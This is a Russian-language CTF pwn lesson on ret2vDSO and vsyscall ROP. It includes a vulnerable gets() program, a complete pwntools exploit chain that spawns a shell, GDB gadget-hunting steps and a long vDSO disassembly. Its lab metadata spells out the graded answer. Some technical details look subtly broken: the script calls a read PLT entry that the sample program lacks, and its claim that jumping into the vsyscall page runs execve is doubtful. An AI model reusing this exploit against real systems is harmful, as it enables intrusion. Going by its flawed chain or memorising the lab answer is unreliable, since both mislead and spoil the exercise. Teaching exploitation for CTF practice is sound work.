---
id: pwn-ret2vdso
title: "ret2vDSO и vsyscall: гаджеты без libc-утечки"
category: pwn
parent: pwn-rop-exotic
difficulty: medium
order: 2
tags: [ret2vdso, vsyscall, rop, aslr, gadgets, syscall]
prerequisites: [pwn-rop, pwn-mitigations, pwn-ret2libc]
useful_for:
  - "CTF Pwn категория"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Как использовать vDSO и vsyscall-страницу для получения syscall-гаджета и утечки/вызова без известного адреса libc; особенности ASLR и shadow-маппинга."
lab:
  kind: shell
  title: "Практика: гаджет syscall;ret"
  toolset: [core, objdump]
  workdir: /home/student/task
  files: [task.md, vdso.bin, maps.txt]
  check: "grep -q 'gadget=0x111b' answer.txt"
  hints:
    - "`cat maps.txt` — реальные строки [vdso]/[vsyscall]."
    - "`objdump -d vdso.bin` — дизасм vDSO."
    - "Ищи `syscall`, сразу за которым идёт `ret`."
    - "Смещение гаджета — `0x111b`. Запиши `gadget=0x111b`."
---

## Вопрос, с которого всё начинается

Ты набрал ROP-гаджетов `pop rdi`, `pop rsi`, `pop rdx` и хочешь сделать `execve("/bin/sh")`. Но для этого нужен гаджет `syscall` — единственная инструкция, которая передаёт управление ядру. Ищем его в бинаре:

```bash
$ ROPgadget --binary ./chall | grep -c syscall
0
```

Нет. libc-утечки тоже нет — значит, `syscall` из libc не достать. Кажется, что пути дальше нет. Но ядро само отображает в каждый процесс небольшие страницы с кодом, и в них `syscall` **есть**.

## Наш пример: бинарь без syscall-гаджета

```c
// chall.c
#include <stdio.h>
int main(void) {
    char buf[64];
    gets(buf);     // переполнение
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    NX:    NX enabled
    PIE:   No PIE (0x400000)
```

Проверим, какие страницы отображены в процессе. Это делается чтением `/proc/<pid>/maps`, но проще посмотреть карты самого себя:

```bash
$ cat /proc/self/maps | grep -E "vdso|vsyscall"
7ffd3a2b4000-7ffd3a2b6000 r-xp  [vdso]
ffffffffff600000-ffffffffff601000 --xp  [vsyscall]
```

Строка `[vdso]` — маленькая область с кодом. Строка `[vsyscall]` — на **фиксированном** адресе `0xffffffffff600000`, который не меняется от запуска к запуску.

## Шаг 1. Что такое vDSO и vsyscall

**vDSO** (virtual dynamic shared object) — небольшой ELF-образ, который ядро отображает в каждый процесс. Он содержит быстрые реализации некоторых системных вызовов (`gettimeofday`, `clock_gettime`), которые можно выполнить, не переключаясь в ядро. Внутри vDSO есть инструкции `syscall; ret` — а значит, готовые гаджеты.

**vsyscall** — старая страница-предшественник vDSO. Её ключевое свойство: адрес **фиксирован** (`0xffffffffff600000`), ASLR её не двигает. Она содержит три функции:

| Функция | Адрес |
|---|---|
| `gettimeofday` | `0xffffffffff600000` |
| `time` | `0xffffffffff600400` |
| `getcpu` | `0xffffffffff600800` |

Каждая внутри выполняет `mov rax, N; syscall; ret`. Нас интересует последняя пара инструкций: если прыгнуть на такую функцию, уже имея нужное значение `rax`, она выполнит `syscall`.

## Шаг 2. Прицел: execve через vsyscall

Для `execve("/bin/sh")` на x86-64 нужно выставить регистры: номер вызова `59` в `rax`, указатель на строку в `rdi`, а `rsi` и `rdx` обнулить. Найдём нужные `pop`-гаджеты в бинаре:

```bash
$ ROPgadget --binary ./chall | grep -E "pop rax|pop rdi|pop rsi|pop rdx"
0x00000000004011f3 : pop rax ; ret
0x00000000004011f5 : pop rdi ; ret
0x00000000004011f7 : pop rsi ; ret
0x00000000004011f9 : pop rdx ; ret
```

Строку `/bin/sh` положим в `.bss` — прочитаем её туда через `read`. А в конце вместо отсутствующего `syscall` прыгнем на `0xffffffffff600000`.

## Шаг 3. Собираем цепочку

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72
bss = elf.bss() + 0x400

pop_rax = 0x4011f3
pop_rdi = 0x4011f5
pop_rsi = 0x4011f7
pop_rdx = 0x4011f9
vsyscall = 0xffffffffff600000

p = process('./chall')
# сначала read(0, bss, 8) — кладём "/bin/sh\0"
stage1  = p64(pop_rdi) + p64(0)
stage1 += p64(pop_rsi) + p64(bss)
stage1 += p64(pop_rdx) + p64(8)
stage1 += p64(elf.plt['read'])
# затем execve("/bin/sh")
stage1 += p64(pop_rax) + p64(59)
stage1 += p64(pop_rdi) + p64(bss)
stage1 += p64(pop_rsi) + p64(0)
stage1 += p64(pop_rdx) + p64(0)
stage1 += p64(vsyscall)          # <-- syscall из фиксированной страницы

p.sendline(flat({OFFSET: stage1}))
p.send(b'/bin/sh\x00')
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Мы выполнили `execve`, вообще не имея ни `syscall` в бинаре, ни адреса libc.

## Шаг 4. Как достать гаджеты из vDSO

Если `vsyscall` отключён (см. ниже), остаётся vDSO. Его адрес рандомизирован, но если у тебя есть **любая** утечка — можно вычислить базу и найти в нём `syscall; ret`. В GDB:

```text
(gdb) info proc mappings
0x7ffff7fcd000  0x7ffff7fcf000  [vdso]
(gdb) dump memory vdso.bin 0x7ffff7fcd000 0x7ffff7fcf000
(gdb) shell ROPgadget --binary vdso.bin | grep 'syscall'
0x0000000000000a3e : syscall ; ret
```

Дальше вычисляем смещение `0xa3e` и прибавляем к утёкшей базе vDSO. Это даёт `syscall; ret`-гаджет, даже когда бинарь ими беден.

## Шаг 5. Ограничения современных систем

- **vsyscall отключён.** В ядрах с `vsyscall=none` страница недоступна. Проверяй `/proc/self/maps`.
- **Режим `emulate`.** Тогда вызовы эмулируются, но `syscall`-инструкция всё ещё присутствует в коде — обычно срабатывает.
- **`vsyscall=xonly`.** Страница исполняема, но не читаема: прыгнуть можно, дизассемблировать — нет.
- **vDSO рандомизирован.** Без утечки базы не найти.
- **Контейнеры/песочницы** часто скрывают vsyscall — проверяй окружение перед выбором приёма.

## Как проверить, доступна ли страница

Перед сборкой цепочки убедись, что приём вообще применим. В GDB выполни `info proc mappings` и найди строку `[vsyscall]`:

```text
(gdb) info proc mappings
0xffffffffff600000 0xffffffffff601000 0x0  [vsyscall]
```

Если строки нет — ядро отключило страницу (`vsyscall=none`), и этот путь закрыт. Если есть только `[vdso]` без фиксированного адреса — придётся сначала утечь базу vDSO. В контейнерах и песочницах vsyscall часто скрыт; тогда проверь, нет ли `syscall`-гаджета прямо в бинаре или в статически прилинкованной libc.

## Почему это обходит ASLR

Ключ в том, что нам вообще не нужен адрес libc. `pop`-гаджеты мы берём из бинаря, а при выключенном PIE их адреса фиксированы. Строку `/bin/sh` мы сами записываем в `.bss` через `read`. Единственный адрес, который мы не знаем, — адрес инструкции `syscall`, но его заменяет фиксированная страница vsyscall. Итого в цепочке нет ни одного рандомизированного адреса — ASLR просто не мешает.

Если PIE включён, адреса гаджетов тоже рандомизированы, и понадобится утечка базы кода. Тогда vDSO снова пригодится: в libc рядом с указателями на функции лежат указатели на vDSO, а функция `getauxval(AT_SYSINFO_EHDR)` и вовсе отдаёт её базу напрямую — но это уже требует примитива чтения памяти.

## На что смотреть дальше

- **Нужно выставить все регистры разом?** Тогда SROP через `rt_sigreturn` удобнее (см. `pwn-seccomp-srop`).
- **vsyscall нет, утечки нет, но есть `syscall` в бинаре?** Это классический ret2syscall — собирай ORW/execve напрямую.
- **Статическая линковка без libc?** Смотри `pwn-static-no-libc`.
- **Утечка vDSO приходит из libc** (там лежит указатель на vDSO) — это надёжный способ получить её базу.

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

### Рабочий пример (как в лаборатории)

```
$ objdump -d vdso.bin

vdso.bin:     file format elf64-x86-64


Disassembly of section .text:

00000000000007a0 <__vdso_gettimeofday@@LINUX_2.6-0xc0>:
     7a0:	48 8d 35 59 e8 ff ff 	lea    -0x17a7(%rip),%rsi        # fffffffffffff000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffffd990>
     7a7:	eb 13                	jmp    7bc <LINUX_2.6@@LINUX_2.6+0x7bc>
     7a9:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
     7ad:	4c 8b 46 10          	mov    0x10(%rsi),%r8
     7b1:	0f 01 f9             	rdtscp
     7b4:	66 90                	xchg   %ax,%ax
     7b6:	8b 0e                	mov    (%rsi),%ecx
     7b8:	39 cf                	cmp    %ecx,%edi
     7ba:	74 0f                	je     7cb <LINUX_2.6@@LINUX_2.6+0x7cb>
     7bc:	8b 3e                	mov    (%rsi),%edi
     7be:	85 ff                	test   %edi,%edi
     7c0:	75 e7                	jne    7a9 <LINUX_2.6@@LINUX_2.6+0x7a9>
     7c2:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
     7c9:	c3                   	ret
     7ca:	cc                   	int3
     7cb:	48 c1 e2 20          	shl    $0x20,%rdx
     7cf:	48 09 c2             	or     %rax,%rdx
     7d2:	48 89 d0             	mov    %rdx,%rax
     7d5:	49 f7 e1             	mul    %r9
     7d8:	49 8d 04 10          	lea    (%r8,%rdx,1),%rax
     7dc:	48 0f ba f0 3f       	btr    $0x3f,%rax
     7e1:	c3                   	ret
     7e2:	cc                   	int3
     7e3:	66 90                	xchg   %ax,%ax
     7e5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
     7ec:	00 00 00 00 
     7f0:	8b 15 0a d8 ff ff    	mov    -0x27f6(%rip),%edx        # ffffffffffffe000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffffc990>
     7f6:	48 8d 35 03 d8 ff ff 	lea    -0x27fd(%rip),%rsi        # ffffffffffffe000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffffc990>
     7fd:	f6 46 1d 01          	testb  $0x1,0x1d(%rsi)
     801:	74 50                	je     853 <LINUX_2.6@@LINUX_2.6+0x853>
     803:	89 d7                	mov    %edx,%edi
     805:	83 e7 fe             	and    $0xfffffffe,%edi
     808:	0f 01 f9             	rdtscp
     80b:	66 90                	xchg   %ax,%ax
     80d:	48 c1 e2 20          	shl    $0x20,%rdx
     811:	48 09 c2             	or     %rax,%rdx
     814:	48 89 d0             	mov    %rdx,%rax
     817:	0f be 56 1c          	movsbl 0x1c(%rsi),%edx
     81b:	48 2b 46 08          	sub    0x8(%rsi),%rax
     81f:	49 89 c0             	mov    %rax,%r8
     822:	89 d1                	mov    %edx,%ecx
     824:	f7 d9                	neg    %ecx
     826:	49 d3 e8             	shr    %cl,%r8
     829:	89 d1                	mov    %edx,%ecx
     82b:	48 d3 e0             	shl    %cl,%rax
     82e:	85 d2                	test   %edx,%edx
     830:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
     834:	8b 56 18             	mov    0x18(%rsi),%edx
     837:	49 0f 48 c0          	cmovs  %r8,%rax
     83b:	48 f7 e2             	mul    %rdx
     83e:	48 0f ac d0 20       	shrd   $0x20,%rdx,%rax
     843:	8b 16                	mov    (%rsi),%edx
     845:	39 d7                	cmp    %edx,%edi
     847:	75 b4                	jne    7fd <LINUX_2.6@@LINUX_2.6+0x7fd>
     849:	48 01 c8             	add    %rcx,%rax
     84c:	48 0f ba f0 3f       	btr    $0x3f,%rax
     851:	c3                   	ret
     852:	cc                   	int3
     853:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
     85a:	c3                   	ret
     85b:	cc                   	int3
     85c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000860 <__vdso_gettimeofday@@LINUX_2.6>:
     860:	f3 0f 1e fa          	endbr64
     864:	55                   	push   %rbp
     865:	4c 8d 1d 94 97 ff ff 	lea    -0x686c(%rip),%r11        # ffffffffffffa000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff8990>
     86c:	48 89 e5             	mov    %rsp,%rbp
     86f:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
     873:	48 83 ec 20          	sub    $0x20,%rsp
     877:	48 85 ff             	test   %rdi,%rdi
     87a:	0f 84 91 00 00 00    	je     911 <__vdso_gettimeofday@@LINUX_2.6+0xb1>
     880:	45 8b 03             	mov    (%r11),%r8d
     883:	45 89 c2             	mov    %r8d,%r10d
     886:	41 83 e2 01          	and    $0x1,%r10d
     88a:	0f 85 b9 00 00 00    	jne    949 <__vdso_gettimeofday@@LINUX_2.6+0xe9>
     890:	41 8b 43 04          	mov    0x4(%r11),%eax
     894:	83 f8 01             	cmp    $0x1,%eax
     897:	0f 85 bd 00 00 00    	jne    95a <__vdso_gettimeofday@@LINUX_2.6+0xfa>
     89d:	0f 01 f9             	rdtscp
     8a0:	66 90                	xchg   %ax,%ax
     8a2:	48 c1 e2 20          	shl    $0x20,%rdx
     8a6:	48 09 c2             	or     %rax,%rdx
     8a9:	48 0f ba f2 3f       	btr    $0x3f,%rdx
     8ae:	4d 8b 4b 30          	mov    0x30(%r11),%r9
     8b2:	41 8b 4b 24          	mov    0x24(%r11),%ecx
     8b6:	49 2b 53 08          	sub    0x8(%r11),%rdx
     8ba:	49 39 53 10          	cmp    %rdx,0x10(%r11)
     8be:	0f 82 b2 00 00 00    	jb     976 <__vdso_gettimeofday@@LINUX_2.6+0x116>
     8c4:	41 8b 43 20          	mov    0x20(%r11),%eax
     8c8:	48 0f af c2          	imul   %rdx,%rax
     8cc:	4c 01 c8             	add    %r9,%rax
     8cf:	48 d3 e8             	shr    %cl,%rax
     8d2:	49 8b 53 28          	mov    0x28(%r11),%rdx
     8d6:	41 8b 0b             	mov    (%r11),%ecx
     8d9:	41 39 c8             	cmp    %ecx,%r8d
     8dc:	75 a2                	jne    880 <__vdso_gettimeofday@@LINUX_2.6+0x20>
     8de:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     8e4:	76 15                	jbe    8fb <__vdso_gettimeofday@@LINUX_2.6+0x9b>
     8e6:	48 2d 00 ca 9a 3b    	sub    $0x3b9aca00,%rax
     8ec:	41 83 c2 01          	add    $0x1,%r10d
     8f0:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     8f6:	77 ee                	ja     8e6 <__vdso_gettimeofday@@LINUX_2.6+0x86>
     8f8:	4c 01 d2             	add    %r10,%rdx
     8fb:	89 c0                	mov    %eax,%eax
     8fd:	48 89 17             	mov    %rdx,(%rdi)
     900:	48 69 c0 d3 4d 62 10 	imul   $0x10624dd3,%rax,%rax
     907:	48 c1 e8 26          	shr    $0x26,%rax
     90b:	89 c0                	mov    %eax,%eax
     90d:	48 89 47 08          	mov    %rax,0x8(%rdi)
     911:	48 85 f6             	test   %rsi,%rsi
     914:	75 05                	jne    91b <__vdso_gettimeofday@@LINUX_2.6+0xbb>
     916:	31 c0                	xor    %eax,%eax
     918:	c9                   	leave
     919:	c3                   	ret
     91a:	cc                   	int3
     91b:	81 3d df 96 ff ff ff 	cmpl   $0x7fffffff,-0x6921(%rip)        # ffffffffffffa004 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff8994>
     922:	ff ff 7f 
     925:	48 8d 05 d4 a6 ff ff 	lea    -0x592c(%rip),%rax        # ffffffffffffb000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff9990>
     92c:	74 06                	je     934 <__vdso_gettimeofday@@LINUX_2.6+0xd4>
     92e:	48 2d 00 10 00 00    	sub    $0x1000,%rax
     934:	8b 90 10 09 00 00    	mov    0x910(%rax),%edx
     93a:	89 16                	mov    %edx,(%rsi)
     93c:	8b 80 14 09 00 00    	mov    0x914(%rax),%eax
     942:	89 46 04             	mov    %eax,0x4(%rsi)
     945:	31 c0                	xor    %eax,%eax
     947:	eb cf                	jmp    918 <__vdso_gettimeofday@@LINUX_2.6+0xb8>
     949:	41 81 7b 04 ff ff ff 	cmpl   $0x7fffffff,0x4(%r11)
     950:	7f 
     951:	74 60                	je     9b3 <__vdso_gettimeofday@@LINUX_2.6+0x153>
     953:	f3 90                	pause
     955:	e9 26 ff ff ff       	jmp    880 <__vdso_gettimeofday@@LINUX_2.6+0x20>
     95a:	83 f8 02             	cmp    $0x2,%eax
     95d:	0f 84 2a 01 00 00    	je     a8d <__vdso_gettimeofday@@LINUX_2.6+0x22d>
     963:	83 f8 03             	cmp    $0x3,%eax
     966:	0f 84 ec 00 00 00    	je     a58 <__vdso_gettimeofday@@LINUX_2.6+0x1f8>
     96c:	b8 60 00 00 00       	mov    $0x60,%eax
     971:	0f 05                	syscall
     973:	c9                   	leave
     974:	c3                   	ret
     975:	cc                   	int3
     976:	48 0f ba e2 3e       	bt     $0x3e,%rdx
     97b:	73 0b                	jae    988 <__vdso_gettimeofday@@LINUX_2.6+0x128>
     97d:	4c 89 c8             	mov    %r9,%rax
     980:	48 d3 e8             	shr    %cl,%rax
     983:	e9 4a ff ff ff       	jmp    8d2 <__vdso_gettimeofday@@LINUX_2.6+0x72>
     988:	48 89 d0             	mov    %rdx,%rax
     98b:	41 8b 53 20          	mov    0x20(%r11),%edx
     98f:	48 0f ba f0 3f       	btr    $0x3f,%rax
     994:	48 f7 e2             	mul    %rdx
     997:	4c 01 c8             	add    %r9,%rax
     99a:	48 83 d2 00          	adc    $0x0,%rdx
     99e:	48 0f ad d0          	shrd   %cl,%rdx,%rax
     9a2:	48 d3 ea             	shr    %cl,%rdx
     9a5:	83 e1 40             	and    $0x40,%ecx
     9a8:	48 0f 45 c2          	cmovne %rdx,%rax
     9ac:	e9 21 ff ff ff       	jmp    8d2 <__vdso_gettimeofday@@LINUX_2.6+0x72>
     9b1:	f3 90                	pause
     9b3:	45 8b 93 00 10 00 00 	mov    0x1000(%r11),%r10d
     9ba:	41 f6 c2 01          	test   $0x1,%r10b
     9be:	75 f1                	jne    9b1 <__vdso_gettimeofday@@LINUX_2.6+0x151>
     9c0:	41 8b 83 04 10 00 00 	mov    0x1004(%r11),%eax
     9c7:	83 f8 01             	cmp    $0x1,%eax
     9ca:	0f 85 fb 00 00 00    	jne    acb <__vdso_gettimeofday@@LINUX_2.6+0x26b>
     9d0:	0f 01 f9             	rdtscp
     9d3:	66 90                	xchg   %ax,%ax
     9d5:	48 c1 e2 20          	shl    $0x20,%rdx
     9d9:	48 09 c2             	or     %rax,%rdx
     9dc:	48 0f ba f2 3f       	btr    $0x3f,%rdx
     9e1:	4d 8b 83 30 10 00 00 	mov    0x1030(%r11),%r8
     9e8:	41 8b 8b 24 10 00 00 	mov    0x1024(%r11),%ecx
     9ef:	49 2b 93 08 10 00 00 	sub    0x1008(%r11),%rdx
     9f6:	49 39 93 10 10 00 00 	cmp    %rdx,0x1010(%r11)
     9fd:	0f 82 b6 00 00 00    	jb     ab9 <__vdso_gettimeofday@@LINUX_2.6+0x259>
     a03:	41 8b 83 20 10 00 00 	mov    0x1020(%r11),%eax
     a0a:	48 0f af c2          	imul   %rdx,%rax
     a0e:	4c 01 c0             	add    %r8,%rax
     a11:	48 d3 e8             	shr    %cl,%rax
     a14:	49 8b 8b 28 10 00 00 	mov    0x1028(%r11),%rcx
     a1b:	41 8b 93 00 10 00 00 	mov    0x1000(%r11),%edx
     a22:	44 39 d2             	cmp    %r10d,%edx
     a25:	75 8c                	jne    9b3 <__vdso_gettimeofday@@LINUX_2.6+0x153>
     a27:	48 03 05 02 96 ff ff 	add    -0x69fe(%rip),%rax        # ffffffffffffa030 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff89c0>
     a2e:	48 03 0d f3 95 ff ff 	add    -0x6a0d(%rip),%rcx        # ffffffffffffa028 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff89b8>
     a35:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     a3b:	76 78                	jbe    ab5 <__vdso_gettimeofday@@LINUX_2.6+0x255>
     a3d:	31 d2                	xor    %edx,%edx
     a3f:	48 2d 00 ca 9a 3b    	sub    $0x3b9aca00,%rax
     a45:	83 c2 01             	add    $0x1,%edx
     a48:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     a4e:	77 ef                	ja     a3f <__vdso_gettimeofday@@LINUX_2.6+0x1df>
     a50:	48 01 ca             	add    %rcx,%rdx
     a53:	e9 a3 fe ff ff       	jmp    8fb <__vdso_gettimeofday@@LINUX_2.6+0x9b>
     a58:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
     a5d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
     a62:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
     a67:	e8 34 fd ff ff       	call   7a0 <LINUX_2.6@@LINUX_2.6+0x7a0>
     a6c:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
     a71:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
     a76:	44 8b 44 24 18       	mov    0x18(%rsp),%r8d
     a7b:	48 89 c2             	mov    %rax,%rdx
     a7e:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
     a82:	0f 84 e4 fe ff ff    	je     96c <__vdso_gettimeofday@@LINUX_2.6+0x10c>
     a88:	e9 21 fe ff ff       	jmp    8ae <__vdso_gettimeofday@@LINUX_2.6+0x4e>
     a8d:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
     a92:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
     a97:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
     a9c:	e8 4f fd ff ff       	call   7f0 <LINUX_2.6@@LINUX_2.6+0x7f0>
     aa1:	44 8b 44 24 18       	mov    0x18(%rsp),%r8d
     aa6:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
     aab:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
     ab0:	48 89 c2             	mov    %rax,%rdx
     ab3:	eb c9                	jmp    a7e <__vdso_gettimeofday@@LINUX_2.6+0x21e>
     ab5:	31 d2                	xor    %edx,%edx
     ab7:	eb 97                	jmp    a50 <__vdso_gettimeofday@@LINUX_2.6+0x1f0>
     ab9:	48 0f ba e2 3e       	bt     $0x3e,%rdx
     abe:	73 44                	jae    b04 <__vdso_gettimeofday@@LINUX_2.6+0x2a4>
     ac0:	4c 89 c0             	mov    %r8,%rax
     ac3:	48 d3 e8             	shr    %cl,%rax
     ac6:	e9 49 ff ff ff       	jmp    a14 <__vdso_gettimeofday@@LINUX_2.6+0x1b4>
     acb:	83 f8 02             	cmp    $0x2,%eax
     ace:	74 60                	je     b30 <__vdso_gettimeofday@@LINUX_2.6+0x2d0>
     ad0:	83 f8 03             	cmp    $0x3,%eax
     ad3:	0f 85 93 fe ff ff    	jne    96c <__vdso_gettimeofday@@LINUX_2.6+0x10c>
     ad9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
     ade:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
     ae3:	e8 b8 fc ff ff       	call   7a0 <LINUX_2.6@@LINUX_2.6+0x7a0>
     ae8:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
     aed:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
     af2:	48 89 c2             	mov    %rax,%rdx
     af5:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
     af9:	0f 84 6d fe ff ff    	je     96c <__vdso_gettimeofday@@LINUX_2.6+0x10c>
     aff:	e9 dd fe ff ff       	jmp    9e1 <__vdso_gettimeofday@@LINUX_2.6+0x181>
     b04:	48 89 d0             	mov    %rdx,%rax
     b07:	41 8b 93 20 10 00 00 	mov    0x1020(%r11),%edx
     b0e:	48 0f ba f0 3f       	btr    $0x3f,%rax
     b13:	48 f7 e2             	mul    %rdx
     b16:	4c 01 c0             	add    %r8,%rax
     b19:	48 83 d2 00          	adc    $0x0,%rdx
     b1d:	48 0f ad d0          	shrd   %cl,%rdx,%rax
     b21:	48 d3 ea             	shr    %cl,%rdx
     b24:	80 e1 40             	and    $0x40,%cl
     b27:	48 0f 45 c2          	cmovne %rdx,%rax
     b2b:	e9 e4 fe ff ff       	jmp    a14 <__vdso_gettimeofday@@LINUX_2.6+0x1b4>
     b30:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
     b35:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
     b3a:	e8 b1 fc ff ff       	call   7f0 <LINUX_2.6@@LINUX_2.6+0x7f0>
     b3f:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
     b44:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
     b49:	48 89 c2             	mov    %rax,%rdx
     b4c:	eb a7                	jmp    af5 <__vdso_gettimeofday@@LINUX_2.6+0x295>
     b4e:	66 90                	xchg   %ax,%ax

0000000000000b50 <__vdso_time@@LINUX_2.6>:
     b50:	f3 0f 1e fa          	endbr64
     b54:	81 3d a6 94 ff ff ff 	cmpl   $0x7fffffff,-0x6b5a(%rip)        # ffffffffffffa004 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff8994>
     b5b:	ff ff 7f 
     b5e:	48 8d 05 9b a4 ff ff 	lea    -0x5b65(%rip),%rax        # ffffffffffffb000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff9990>
     b65:	74 06                	je     b6d <__vdso_time@@LINUX_2.6+0x1d>
     b67:	48 2d 00 10 00 00    	sub    $0x1000,%rax
     b6d:	48 8b 40 28          	mov    0x28(%rax),%rax
     b71:	48 85 ff             	test   %rdi,%rdi
     b74:	74 03                	je     b79 <__vdso_time@@LINUX_2.6+0x29>
     b76:	48 89 07             	mov    %rax,(%rdi)
     b79:	c3                   	ret
     b7a:	cc                   	int3
     b7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000b80 <__vdso_clock_gettime@@LINUX_2.6>:
     b80:	f3 0f 1e fa          	endbr64
     b84:	55                   	push   %rbp
     b85:	48 89 e5             	mov    %rsp,%rbp
     b88:	41 56                	push   %r14
     b8a:	53                   	push   %rbx
     b8b:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
     b8f:	48 83 ec 20          	sub    $0x20,%rsp
     b93:	83 ff 17             	cmp    $0x17,%edi
     b96:	0f 87 c4 00 00 00    	ja     c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
     b9c:	b8 01 00 00 00       	mov    $0x1,%eax
     ba1:	89 f9                	mov    %edi,%ecx
     ba3:	4c 8d 1d 56 94 ff ff 	lea    -0x6baa(%rip),%r11        # ffffffffffffa000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff8990>
     baa:	d3 e0                	shl    %cl,%eax
     bac:	89 c2                	mov    %eax,%edx
     bae:	81 e2 83 08 00 00    	and    $0x883,%edx
     bb4:	0f 84 cc 00 00 00    	je     c86 <__vdso_clock_gettime@@LINUX_2.6+0x106>
     bba:	45 8b 0b             	mov    (%r11),%r9d
     bbd:	45 89 ca             	mov    %r9d,%r10d
     bc0:	41 83 e2 01          	and    $0x1,%r10d
     bc4:	0f 85 a7 00 00 00    	jne    c71 <__vdso_clock_gettime@@LINUX_2.6+0xf1>
     bca:	41 8b 43 04          	mov    0x4(%r11),%eax
     bce:	83 f8 01             	cmp    $0x1,%eax
     bd1:	75 7b                	jne    c4e <__vdso_clock_gettime@@LINUX_2.6+0xce>
     bd3:	0f 01 f9             	rdtscp
     bd6:	66 90                	xchg   %ax,%ax
     bd8:	48 c1 e2 20          	shl    $0x20,%rdx
     bdc:	48 09 c2             	or     %rax,%rdx
     bdf:	48 0f ba f2 3f       	btr    $0x3f,%rdx
     be4:	4c 63 c7             	movslq %edi,%r8
     be7:	41 8b 4b 24          	mov    0x24(%r11),%ecx
     beb:	49 2b 53 08          	sub    0x8(%r11),%rdx
     bef:	49 c1 e0 04          	shl    $0x4,%r8
     bf3:	4d 01 d8             	add    %r11,%r8
     bf6:	49 8b 58 30          	mov    0x30(%r8),%rbx
     bfa:	49 39 53 10          	cmp    %rdx,0x10(%r11)
     bfe:	0f 82 30 01 00 00    	jb     d34 <__vdso_clock_gettime@@LINUX_2.6+0x1b4>
     c04:	41 8b 43 20          	mov    0x20(%r11),%eax
     c08:	48 0f af c2          	imul   %rdx,%rax
     c0c:	48 01 d8             	add    %rbx,%rax
     c0f:	48 d3 e8             	shr    %cl,%rax
     c12:	49 8b 50 28          	mov    0x28(%r8),%rdx
     c16:	41 8b 0b             	mov    (%r11),%ecx
     c19:	41 39 c9             	cmp    %ecx,%r9d
     c1c:	75 9c                	jne    bba <__vdso_clock_gettime@@LINUX_2.6+0x3a>
     c1e:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     c24:	76 15                	jbe    c3b <__vdso_clock_gettime@@LINUX_2.6+0xbb>
     c26:	48 2d 00 ca 9a 3b    	sub    $0x3b9aca00,%rax
     c2c:	41 83 c2 01          	add    $0x1,%r10d
     c30:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     c36:	77 ee                	ja     c26 <__vdso_clock_gettime@@LINUX_2.6+0xa6>
     c38:	4c 01 d2             	add    %r10,%rdx
     c3b:	48 89 16             	mov    %rdx,(%rsi)
     c3e:	48 89 46 08          	mov    %rax,0x8(%rsi)
     c42:	48 8d 65 f0          	lea    -0x10(%rbp),%rsp
     c46:	31 c0                	xor    %eax,%eax
     c48:	5b                   	pop    %rbx
     c49:	41 5e                	pop    %r14
     c4b:	5d                   	pop    %rbp
     c4c:	c3                   	ret
     c4d:	cc                   	int3
     c4e:	83 f8 02             	cmp    $0x2,%eax
